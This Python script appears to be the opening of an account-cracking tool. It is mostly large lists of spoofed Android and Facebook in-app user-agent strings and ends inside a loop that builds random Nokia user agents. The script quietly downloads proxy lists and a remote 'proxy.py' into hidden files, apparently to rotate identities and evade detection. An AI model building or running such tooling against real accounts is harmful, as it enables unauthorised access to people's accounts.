import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()

#----------[ UserAgent ]----------#

ugen4=['Dalvik/2.1.0 (Linux; U; Android 13; SM-N986U Build/TP1A.220624.014)',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S908U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 13; SM-S908U Build/TP1A.220624.014)',
'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A226L Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]',
'Mozilla/5.0 (Linux; Android 13; SM-A226L Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/442.0.0.44.114;]',
'Mozilla/5.0 (Linux; Android 13; SM-A226L Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.163 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A226L Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/442.0.0.44.114;]',
'Mozilla/5.0 (Linux; Android 13; SM-A226L Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.163 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-M546B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/442.0.0.44.114;] FBNV/1',
'Dalvik/2.1.0 (Linux; U; Android 12; SM-A115F Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/12;FBAB/com.grandegames.slots.dafu.casino;FBAV/2.38;FBBV/238;FBVS/6.16.0;FBLC/en_US]',
'Mozilla/5.0 (Linux; Android 13; SM-M546B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/442.0.0.44.114;]',
'Mozilla/5.0 (Linux; Android 13; SM-M236L Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/442.0.0.44.114;] FBNV/1',
'Mozilla/5.0 (Linux; Android 13; SM-M236L Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/442.0.0.44.114;]',
'Mozilla/5.0 (Linux; Android 10; Samsung F41 Build/QCOS30.85-18-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Mozilla/5.0 (SMART-TV; LINUX; Tizen 7.0) AppleWebKit/537.1 (KHTML, like Gecko) Mobile TizenBrowser/5.0',
'Mozilla/5.0 (Linux; Android 12; Galaxy S21) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/118.0.5993.80 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-F721N Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.67 Mobile Safari/537.36 DaumApps/6.14.3 DaumDevice/mobile',
'Mozilla/5.0 (Linux; Android 11; Galaxy S21+) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/118.0.5993.80 Mobile Safari/537.46',
'Mozilla/5.0 (Linux; Android 10; SM-J610FN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.163 Mobile Safari/537.36 Hawk/TurboBrowser/v3.0.0.4.23.12271827',
'Mozilla/5.0 (Linux; Android 13; SM-G986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 Reddit/Version 2023.43.0/Build 1257426/Android 13',
'Mozilla/5.0 (Linux; Android 13; SM-G996U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 Reddit/Version 2023.44.0/Build 1268622/Android 13',
'Mozilla/5.0 (Linux; Android 13; SM-G996U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 Reddit/Version 2023.44.0/Build 1268622/Android 13',
'Mozilla/5.0 (Linux; Android 13; SM-G991U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.66 Mobile Safari/537.36 Reddit/Version 2023.44.0/Build 1268622/Android 13',
'Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/11',
'Mozilla/5.0 (Linux; Android 12; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.8.0 Chrome/117.0.0.0 Mobile Safari/537.36',]
ugen3=['Mozilla/5.0 (Linux; U; Android 4.0.4; fr-fr; GT-N7000 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.0.3; fr-fr; GT-I9100 Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; Android 4.3; fr-fr; SAMSUNG GT-I9506-ORANGE Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.1; GT-P5110 Build/JRO03C) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.169 Safari/537.22',
'Mozilla/5.0 (Linux; U; Android 2.3.3; fr-fr; GT-I9100 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; Android 4.1.2; GT-I8190N Build/JZO54K) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.58 Mobile Safari/537.31',
'Mozilla/5.0 (Linux; Android 4.2.1; Nexus 7 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19',
'Mozilla/5.0 (Linux; Android 4.1.1; GT-P5110 Build/JRO03C) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19',
'Mozilla/5.0 (Linux; U; Android 4.1.2; fr-fr; GT-N7100 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; Android 4.1.2; Nexus S Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19',
'Mozilla/5.0 (Linux; Android 4.2.2; Nexus 7 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36',
'Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0',
'Mozilla/5.0 (Android 4.4; Tablet; rv:41.0) Gecko/41.0 Firefox/41.0',
'Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0',
'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0',
'Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0'
'Mozilla/5.0 (Android; Tablet; rv:40.0) Gecko/40.0 Firefox/40.0',
'Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0',
'Mozilla/5.0 (Android 4.4; Tablet; rv:41.0) Gecko/41.0 Firefox/41.0',
'Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Safari/537.36',
'Mozilla/5.0 (Android 7.0; Mobile; rv:62.0) Gecko/62.0 Firefox/62.0',
'Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Klar/1.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/4.1 Chrome/62.0.3029.83 Mobile Safari/537.36',
'Mozilla/5.0 (Android 7.0; Mobile; rv:62.0) Gecko/62.0 Firefox/62.0',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/7.0.4 Mobile/16B91 Safari/605.1.15',
'Mozilla/5.0 (Linux; Android 7.1.2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/3.0 Chrome/59.0.3017.125 Safari/537.36',
'Mozilla/5.0 (Linux; <Android version>) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/<firefoxversion> Chrome/<Chrome Rev> Safari/<WebKit Rev>',
'Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.1 Chrome/59.0.3017.125 Safari/537.36',
'Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0',
'Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0',
'Mozilla/5.0 (TV; rv:44.0) Gecko/44.0 Firefox/44.0',
'Mozilla/5.0 (Mobile; nnnn; rv:26.0) Gecko/26.0 Firefox/26.0',
'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A146U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 13; SM-A146U Build/TP1A.220624.014)',
'Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36',]
ugen2=['Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.2 Chrome/44.0.2403.133 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,gzip(gfe)',
'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.3.6; fr-fr; GT-S5839i Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; Android 4.0.4; LT30p Build/7.0.A.3.195) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19',
'Mozilla/5.0 (Linux; U; Android 2.3.6; fr-fr; GT-S5360 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.1.2; fr-fr; GT-P5110 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.1.2; fr-fr; GT-P3110 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
'Mozilla/5.0 (Linux; Android 4.0.4; LT30p Build/7.0.A.1.303) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19',
'Mozilla/5.0 (Linux; U; Android 4.1.2; fr-fr; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.1.2; fr-fr; GT-N8010 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.1.2; fr-fr; GT-I9100 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; Android 4.3; fr-fr; SAMSUNG GT-I9505 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 2.3.3; fr-fr; GT-S5830 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.1.1; fr-fr; GT-P5110 Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
'Mozilla/5.0 (Linux; Android 4.1.2; LT30p Build/9.1.A.1.140) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19',
'Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19',
'Mozilla/5.0 (Linux; Android 4.3; fr-fr; SAMSUNG GT-I9505/I9505XXUEMKF Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; GT-N7100 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19',
'Mozilla/5.0 (Linux; U; Android 4.2.2; fr-fr; GT-P5210 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
'Mozilla/5.0 (Android; Mobile; rv:20.0) Gecko/20.0 Firefox/20.0',
'Mozilla/5.0 (Linux; U; Android 1.5; fr-fr; GT-I5700 Build/CUPCAKE) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1',
'Mozilla/5.0 (Linux; Android 4.3; fr-fr; SAMSUNG SM-N9005/N9005XXUDMJ7 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 4.2.2; fr-fr; ARNOVA 101 G4 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',]
ugen=['Mozilla/5.0 (SMART-TV; Linux; Tizen 2.3) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.0 TV Safari/538.1',
'Mozilla/5.0 (SMART-TV; X11; Linux armv7l) AppleWebkit/537.42 (KHTML, like Gecko) Safari/537.42',
'Mozilla/5.0 (SMART-TV;X11; Linux i686) AppleWebkit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+',
'Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/534.7 (KHTML, like Gecko) Version/5.0 Safari/534.7',
'Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2 (KHTML, like Gecko) Web Browser/1.0 SmartTV Safari/531.2+',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G925F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.0 Mobile Safari/537.3',
'Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) Version/2.3 Mobile Safari/537.3',
'Mozilla/5.0 (SMART-TV; Linux; Tizen 2.3) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.0 TV Safari/538.1',
'Mozilla/5.0 (SMART-TV; Linux; Tizen 2.2; SAMSUNG SM-Z910F) AppleWebKit/537.3 (KHTML, like Gecko) Version/2.2 TV Safari/538.1',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G925K Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile VR Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-N960N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 YaBrowser/16.2.0.5397.00 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 YaBrowser/15.10.2454.3845.00 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F/G925FXXU3QOJQ Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F/G925FXXU3QOJQ Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F/G925FXXU2QOH8 Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 YaBrowser/15.6.2311.5718.00 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 YaBrowser/16.2.1.7529.00 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 YaBrowser/15.12.2.6773.00 Yowser/2.5.3 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 YaBrowser/15.12.1.6403.00 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G925F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 YaBrowser/15.6.2311.6088.00 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SM-G925F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 YaBrowser/15.6.2311.6088.00 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G925F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F/G925FXXU2POFC Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G925F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F/G925FXXU2POGJ Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G925F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F/XXU3QOIT Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F/XXU3QOIT Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F/G925FXXU2POGJ Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G925F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/38.0.2125.102 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Mobile Safari/537.36',]
free=[]
prem=[]
cokbrut=[]
ses=requests.Session()
princp=[]

#----------[ Prox Legend ]----------#

try: 
	prox= requests.get('https://github.com/tigerrkrd/prox-vip/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	prox=open('.prox.txt','r').read().splitlines()

###

try: 
	prox= requests.get('https://github.com/tigerrkrd/prox-vip/blob/main/proxy.py').text
	open('.proxy.py','w').write(prox)
except Exception as e:
	prox=open('.proxy.py','r').read().splitlines()

###

try: 
	prox= requests.get('https://github.com/tigerrkrd/prox-vip/blob/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

#----------[ Ugen Mobile ]----------#

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
